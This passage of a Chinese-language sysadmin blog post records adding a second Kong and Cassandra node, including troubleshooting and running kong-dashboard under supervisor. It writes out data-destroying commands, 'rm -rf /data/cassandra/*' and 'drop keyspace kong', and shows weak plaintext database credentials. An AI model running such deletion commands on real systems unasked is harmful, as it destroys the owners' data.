LISTEN      28598/java</span><br><span class="line">tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 0.0.0.0:8001            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 127.0.0.1:35503         0.0.0.0:*               LISTEN      28598/java</span><br><span class="line">tcp        0      0 10.25.87.159:9042       0.0.0.0:*               LISTEN      28598/java</span><br><span class="line">tcp        0      0 10.25.87.159:7000       0.0.0.0:*               LISTEN      28598/java</span><br></pre></td></tr></table></figure><hr><h3 id="部署另外一台kong和cassandra"><a href="#部署另外一台kong和cassandra" class="headerlink" title="部署另外一台kong和cassandra"></a>部署另外一台kong和cassandra</h3><p>今天在阿里云镜像了kong-node1的服务器.新的服务器名字为kong-node2.<br>软件已经安装,只需要修改部分配置</p><h5 id="修改node1和node2上的cassandra配置"><a href="#修改node1和node2上的cassandra配置" class="headerlink" title="修改node1和node2上的cassandra配置"></a>修改node1和node2上的cassandra配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在node1和node2上:</span><br><span class="line">[work@kong-node2 ~]$ vim /usr/local/cassandra/conf/cassandra.yaml</span><br><span class="line">#修改seeds配置.添加2台服务器的内网IP地址</span><br><span class="line">- seeds: &quot;10.25.87.159, 10.80.229.244&quot; </span><br><span class="line"></span><br><span class="line">在node2上修改侦听地址</span><br><span class="line">[work@kong-node2 ~]$ vim /usr/local/cassandra/conf/cassandra.yaml</span><br><span class="line">#将下列地址改成node2内网地址</span><br><span class="line">listen_address: 10.80.229.244</span><br><span class="line">rpc_address: 10.80.229.244</span><br></pre></td></tr></table></figure><h5 id="在node2上修改kong的配置文件"><a href="#在node2上修改kong的配置文件" class="headerlink" title="在node2上修改kong的配置文件:"></a>在node2上修改kong的配置文件:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node2 ~]$ vim /etc/kong/kong.conf</span><br><span class="line">#连接本机的cassandra数据库地址</span><br><span class="line">cassandra_contact_points = 10.80.229.244</span><br></pre></td></tr></table></figure><blockquote><p>note:千万不要启动node2上的cassandra.因为node2是从node1镜像过去的.所以数据库的token是一模一样的.</p></blockquote><h5 id="在node2上删除cassandra的数据库-这一步非常重要-因为这是从node1镜像过来的-所以node2上的数据库是node1的数据"><a href="#在node2上删除cassandra的数据库-这一步非常重要-因为这是从node1镜像过来的-所以node2上的数据库是node1的数据" class="headerlink" title="在node2上删除cassandra的数据库.这一步非常重要.因为这是从node1镜像过来的.所以node2上的数据库是node1的数据"></a>在node2上删除cassandra的数据库.这一步非常重要.因为这是从node1镜像过来的.所以node2上的数据库是node1的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /data/cassandra/*</span><br></pre></td></tr></table></figure><h5 id="启动node2上的数据库"><a href="#启动node2上的数据库" class="headerlink" title="启动node2上的数据库"></a>启动node2上的数据库</h5><p>直接在命令行执行:cassandra</p><h5 id="查看cassandra的单台服务器状态"><a href="#查看cassandra的单台服务器状态" class="headerlink" title="查看cassandra的单台服务器状态"></a>查看cassandra的单台服务器状态</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ nodetool info</span><br><span class="line">ID                     : 4fe1df37-e69e-4a25-acdc-4b2d73a92225</span><br><span class="line">Gossip active          : true</span><br><span class="line">Thrift active          : false</span><br><span class="line">Native Transport active: true</span><br><span class="line">Load                   : 522.87 KiB</span><br><span class="line">Generation No          : 1540372001</span><br><span class="line">Uptime (seconds)       : 63895</span><br><span class="line">Heap Memory (MB)       : 404.89 / 1004.00</span><br><span class="line">Off Heap Memory (MB)   : 0.00</span><br><span class="line">Data Center            : datacenter1</span><br><span class="line">Rack                   : rack1</span><br><span class="line">Exceptions             : 0</span><br><span class="line">Key Cache              : entries 59, size 5.03 KiB, capacity 50 MiB, 7540 hits, 7911 requests, 0.953 recent hit rate, 14400 save period in seconds</span><br><span class="line">Row Cache              : entries 0, size 0 bytes, capacity 0 bytes, 0 hits, 0 requests, NaN recent hit rate, 0 save period in seconds</span><br><span class="line">Counter Cache          : entries 0, size 0 bytes, capacity 25 MiB, 0 hits, 0 requests, NaN recent hit rate, 7200 save period in seconds</span><br><span class="line">Chunk Cache            : entries 28, size 1.75 MiB, capacity 219 MiB, 1237 misses, 26133 requests, 0.953 recent hit rate, NaN microseconds miss latency</span><br><span class="line">Percent Repaired       : 100.0%</span><br><span class="line">Token                  : (invoke with -T/--tokens to see all 256 tokens)</span><br></pre></td></tr></table></figure><h5 id="查看cassandra集群状态-可以看到集群中2台服务器"><a href="#查看cassandra集群状态-可以看到集群中2台服务器" class="headerlink" title="查看cassandra集群状态.可以看到集群中2台服务器"></a>查看cassandra集群状态.可以看到集群中2台服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address        Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  10.80.229.244  339.93 KiB  256          51.3%             04a75f63-be99-4f3e-93ff-937bbe9656d8  rack1</span><br><span class="line">UN  10.25.87.159   522.87 KiB  256          48.7%             4fe1df37-e69e-4a25-acdc-4b2d73a92225  rack1</span><br></pre></td></tr></table></figure><hr><h4 id="以下是我踩过的坑-在没有删除node2上的数据库文件情况下-直接启动cassnadra"><a href="#以下是我踩过的坑-在没有删除node2上的数据库文件情况下-直接启动cassnadra" class="headerlink" title="以下是我踩过的坑.在没有删除node2上的数据库文件情况下,直接启动cassnadra."></a>以下是我踩过的坑.在没有删除node2上的数据库文件情况下,直接启动cassnadra.</h4><p>启动node2的cassandra后.发现集群无法正常启动.使用cassandra自带的nodetool工具可以查看集群状态.这里只有自己一台服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 ~]$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address        Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  10.80.229.244  600.05 KiB  256          100.0%            4fe1df37-e69e-4a25-acdc-4b2d73a92225  rack1</span><br></pre></td></tr></table></figure><p>查看cassandra启动日志,发现日志提示和node1有一样的token:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">less /usr/local/cassandra/logs/system.log</span><br><span class="line"></span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -9066137612411979055.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -912539082610246005.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -9125687604150710607.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -9186325188411815558.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -934168442605847346.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -937629522304513228.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -983284835358960159.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1111859401021864246.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1185525604491731552.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1209704333924286496.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1243859262038298713.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1284321765579584761.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1472069791929520463.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1479257042759500258.  Ignoring /10.25.87.159</span><br></pre></td></tr></table></figure><p>不仅如此,在node1上启动kong,提示cassandra数据库验证失败.以及提示kong需要migrations up(只需要在第一次启动kong时才需要migratios up):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ kong restart -c /etc/kong/kong.conf</span><br><span class="line">Error: /usr/local/share/lua/5.1/kong/cmd/start.lua:37: [cassandra error] the current database schema does not match this version of Kong. Please run `kong migrations up` to update/initialize the database schema. Be aware that Kong migrations should only run from a single node, and that nodes running migrations concurrently will conflict with each other and might corrupt your database schema!</span><br></pre></td></tr></table></figure><p>kong migrations失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> work@kong-node1 bin]$ kong migrations up -c /etc/kong/kong.conf</span><br><span class="line">migrating core for keyspace kong</span><br><span class="line">core migrated up to: 2015-01-12-175310_skeleton</span><br><span class="line">Error: [cassandra error] Error during migration 2015-01-12-175310_init_schema: [Invalid] Undefined column name request_host</span><br></pre></td></tr></table></figure><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>启动node1和node2的cassandra</p><p>1.在node1和node2上drop kong的键空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ cqlsh 10.25.87.159 -ukong -pkong</span><br><span class="line">Connected to dwd_cassandra at 10.25.87.159:9042.</span><br><span class="line">[cqlsh 5.0.1 | Cassandra 3.11.3 | CQL spec 3.4.4 | Native protocol v4]</span><br><span class="line">Use HELP for help.</span><br><span class="line">kong@cqlsh&gt; drop keyspace kong;</span><br><span class="line">kong@cqlsh&gt; exit</span><br><span class="line"></span><br><span class="line">[work@kong-node2 ~]$ cqlsh 10.80.229.244 -ukong -pkong</span><br><span class="line">Connected to dwd_cassandra at 10.80.229.244:9042.</span><br><span class="line">[cqlsh 5.0.1 | Cassandra 3.11.3 | CQL spec 3.4.4 | Native protocol v4]</span><br><span class="line">Use HELP for help.</span><br><span class="line">kong@cqlsh&gt; drop KEYSPACE kong;</span><br><span class="line">ConfigurationException: Cannot drop non existing keyspace &apos;kong&apos;.</span><br><span class="line">kong@cqlsh&gt; exit</span><br></pre></td></tr></table></figure><p>2.删除kong的键空间目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[work@kong-node1 bin]$ rm -rf  /data/cassandra/kong/</span><br><span class="line">[work@kong-node1 bin]$ ll /data/cassandra/kong/</span><br><span class="line">ls: cannot access /data/cassandra/kong/: No such file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[work@kong-node2 ~]$ rm -rf /data/cassandra/kong/</span><br><span class="line">[work@kong-node2 ~]$ ll /data/cassandra/kong/</span><br><span class="line">ls: cannot access /data/cassandra/kong/: No such file or directory</span><br></pre></td></tr></table></figure><p>3.在node1上创建kong键空间.创建完毕后,应该会同步到node2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ cqlsh 10.25.87.159 -ukong -pkong</span><br><span class="line">Connected to dwd_cassandra at 10.25.87.159:9042.</span><br><span class="line">[cqlsh 5.0.1 | Cassandra 3.11.3 | CQL spec 3.4.4 | Native protocol v4]</span><br><span class="line">Use HELP for help.</span><br><span class="line">kong@cqlsh&gt; CREATE KEYSPACE kong WITH REPLICATION = &#123; &apos;class&apos; : &apos;SimpleStrategy&apos;, &apos;replication_factor&apos; : 1&#125;;</span><br><span class="line">kong@cqlsh&gt; exit</span><br></pre></td></tr></table></figure><p>4.在node1上执行 kong migrations up ,执行完后同样会同步到node2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node1 bin]$ kong migrations up -c /etc/kong/kong.conf</span><br><span class="line">migrating core for keyspace kong</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">66 migrations ran</span><br><span class="line">waiting for Cassandra schema consensus (10000ms timeout)...</span><br><span class="line">Cassandra schema consensus: reached</span><br></pre></td></tr></table></figure><p>5.在node1和node2上启动kong</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ kong restart -c /etc/kong/kong.conf</span><br><span class="line"></span><br><span class="line">[work@kong-node2 ~]$ kong start -c /etc/kong/kong.conf</span><br><span class="line">Kong started</span><br></pre></td></tr></table></figure><hr><h3 id="搭建kong-dashboard"><a href="#搭建kong-dashboard" class="headerlink" title="搭建kong-dashboard"></a>搭建kong-dashboard</h3><p>kong-dashboard是管理kong各个组件(serveice,route,plugin,upstream,consumer)的可视化UI管理工具.在增删改查各个组件的配置时非常方便.</p><p>现在kong-dashboard也支持到了最新版的kong和kong的最新组件.</p><p>kong-dashboard的github参考:<a href="https://github.com/PGBI/kong-dashboard" target="_blank" rel="noopener">kong-dashboar</a></p><hr><p>1.确保需要有node.js环境.如果没有npm工具,必须先安装nodejs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ npm -v</span><br><span class="line">5.6.0</span><br><span class="line">[work@DWD-BETA kong]$ node -v</span><br><span class="line">v8.10.0</span><br></pre></td></tr></table></figure><p>2.root用户执行下列安装命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# npm install -g kong-dashboard</span><br><span class="line">/usr/local/src/nodejs/bin/kong-dashboard -&gt; /usr/local/src/nodejs/lib/node_modules/kong-dashboard/bin/kong-dashboard.js</span><br><span class="line">+ kong-dashboard@3.5.0</span><br><span class="line">added 184 packages in 28.8s</span><br></pre></td></tr></table></figure><p>3.启动kong-dashboard.启动方式有以下几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Start Kong Dashboard</span><br><span class="line">kong-dashboard start --kong-url http://kong:8001</span><br><span class="line"></span><br><span class="line"># Start Kong Dashboard on a custom port</span><br><span class="line">kong-dashboard start \</span><br><span class="line">  --kong-url http://kong:8001 \</span><br><span class="line">  --port [port]</span><br><span class="line"></span><br><span class="line"># Start Kong Dashboard with basic auth</span><br><span class="line">kong-dashboard start \</span><br><span class="line">  --kong-url http://kong:8001 \</span><br><span class="line">  --basic-auth user1=password1 user2=password2</span><br><span class="line"></span><br><span class="line"># See full list of start options</span><br><span class="line">kong-dashboard start --help</span><br></pre></td></tr></table></figure><p>但是kong-dashboard是前台启动,没有deamnize模式.所以将kong-dashboard加入到supervisor进程管理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# vim /etc/supervisor/conf.d/kong-dashboard.conf</span><br><span class="line"></span><br><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/src/nodejs/bin/kong-dashboard start --kong-url http://localhost:8001</span><br><span class="line">numprocs=1</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>修改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# chown -R work.work /etc/supervisor/conf.d/</span><br></pre></td></tr></table></figure><p>更新supervisor配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# supervisorctl update kong-dashboard</span><br><span class="line">kong-dashboard: added process group</span><br></pre></td></tr></table></figure><p>但是由于我这台服务器上8080端口已经被使用,所以启动kong-dashboard报错:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">work@DWD-BETA kong]$ /usr/local/src/nodejs/bin/kong-dashboard start --kong-url http://localhost:8001</span><br><span class="line">Connecting to Kong on http://localhost:8001 ...</span><br><span class="line">Connected to Kong on http://localhost:8001.</span><br><span class="line">Kong version is 0.14.1</span><br><span class="line">Starting Kong Dashboard on port 8080</span><br><span class="line">events.js:183</span><br><span class="line">      throw er; // Unhandled &apos;error&apos; event</span><br><span class="line">      ^</span><br><span class="line"></span><br><span class="line">Error: listen EADDRINUSE :::8080</span><br><span class="line">    at Object._errnoException (util.js:1022:11)</span><br><span class="line">    at _exceptionWithHostPort (util.js:1044:20)</span><br><span class="line">    at Server.setupListenHandle [as _listen2] (net.js:1367:14)</span><br><span class="line">    at listenInCluster (net.js:1408:12)</span><br><span class="line">    at Server.listen (net.js:1492:7)</span><br><span class="line">    at Application.listen (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/node_modules/koa/lib/application.js:65:19)</span><br><span class="line">    at Server.start (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/lib/server.js:32:9)</span><br><span class="line">    at startKongDashboard (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/bin/kong-dashboard.js:189:10)</span><br><span class="line">    at request.get.then.then (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/bin/kong-dashboard.js:178:5)</span><br><span class="line">    at &lt;anonymous&gt;</span><br></pre></td></tr></table></figure><p>8080端口被jenkins占用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ netstat -tulnp | grep 8080</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      17955/java</span><br></pre></td></tr></table></figure><p>更换kong-dashboard端口为8081</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/src/nodejs/bin/kong-dashboard  start --kong-url http://localhost:8001 --port 8081</span><br><span class="line">numprocs=1</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>更新supervisor后,仍然无法启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ supervisorctl update kong-dashboard</span><br><span class="line">kong-dashboard: stopped</span><br><span class="line">kong-dashboard: updated process group</span><br><span class="line">[work@DWD-BETA kong]$ supervisorctl status kong-dashboard</span><br><span class="line">kong-dashboard                   BACKOFF   Exited too quickly (process log may have details)</span><br></pre></td></tr></table></figure><p>手动启动正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ /usr/local/src/nodejs/bin/kong-dashboard  start --kong-url http://localhost:8001 --port 8081</span><br><span class="line">Connecting to Kong on http://localhost:8001 ...</span><br><span class="line">Connected to Kong on http://localhost:8001.</span><br><span class="line">Kong version is 0.14.1</span><br><span class="line">Starting Kong Dashboard on port 8081</span><br><span class="line">Kong Dashboard has started on port 8081</span><br><span class="line">^C</span><br></pre></td></tr></table></figure><p>查看supervisor启动日志文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ less /data/logs/kong/kong-dashboard.log</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br></pre></td></tr></table></figure><p>网上查找解决方案.说是要链接以下文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/bin/nodejs /usr/bin/node</span><br></pre></td></tr></table></figure><p>但是这台服务器上nodejs路径不同,所以执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ sudo ln -s /usr/local/src/nodejs /usr/bin/node</span><br></pre></td></tr></table></figure><p>仍然无法启动,提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br></pre></td></tr></table></figure><p>修改kong-dashboard启动用户为root.仍然无法启动.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/src/nodejs/bin/kong-dashboard  start --kong-url http://127.0.0.1:8001 --port 8081</span><br><span class="line">numprocs=1</span><br><span class="line">user=root</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><hr><p>操作失误在创建软件的时候,删除了nodejs源目录.重新安装了npm和kong-dashboard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">解压nodejs包到:/usr/local/node/</span><br><span class="line"></span><br><span class="line">#设置环境变量: </span><br><span class="line">[root@DWD-BETA ~]# cat /etc/profile | tail -2</span><br><span class="line">export NODEJS_HOME=/usr/local/node/</span><br><span class="line">export PATH=$PATH:$NODEJS_HOME/bin</span><br><span class="line"></span><br><span class="line">[root@DWD-BETA ~]# node -v</span><br><span class="line">v8.10.0</span><br><span class="line">[root@DWD-BETA ~]# npm -v</span><br><span class="line">5.6.0</span><br></pre></td></tr></table></figure><p>创建链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# ln -s /usr/local/node/bin/node /usr/bin/node</span><br><span class="line">root@DWD-BETA ~]# ll /usr/bin/node -d</span><br><span class="line">lrwxrwxrwx 1 root root 24 Nov  3 11:25 /usr/bin/node -&gt; /usr/local/node/bin/node</span><br></pre></td></tr></table></figure><p>修改supervisor配置文件中的命令路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/node/bin/kong-dashboard  start --kong-url http://127.0.0.1:8001 --port 8081</span><br><span class="line">numprocs=1</span><br><span class="line">priority=3</span><br><span class="line">user=root</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>启动kong-dashboard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 